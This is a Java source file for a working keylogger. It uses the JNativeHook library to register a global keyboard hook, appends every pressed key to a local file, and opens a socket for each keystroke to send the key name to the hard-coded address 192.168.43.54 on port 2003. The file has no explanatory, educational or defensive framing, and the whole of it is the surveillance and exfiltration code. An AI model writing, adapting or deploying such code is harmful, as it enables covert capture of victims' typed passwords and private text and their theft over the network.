package core;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.Socket;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener
{

	public static void main(String[] args) 
	{
		try {
			
			File file=new File("output-file.txt");
			FileOutputStream fos=new FileOutputStream(file,true);
			System.setOut(new PrintStream(fos));
			
		}catch (FileNotFoundException e1) {
			
			e1.printStackTrace();
		}
		try {
			
			GlobalScreen.registerNativeHook();
		}catch (NativeHookException e) {
			e.printStackTrace();
			
		}
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
		
		
		

	}

	
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Pressed:"+ NativeKeyEvent.getKeyText(e.getKeyCode()));
		
			   try {
			        Socket s = new Socket("192.168.43.54", 2003);
			        DataOutputStream dos = new DataOutputStream(s.getOutputStream());
			        dos.writeUTF(NativeKeyEvent.getKeyText(e.getKeyCode()));
			       } catch (IOException ie) {
			         ie.printStackTrace();
			       }
			    
	}

	
	public void nativeKeyReleased(NativeKeyEvent arg0) {
	
		
	}

	
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		
		
	}

}
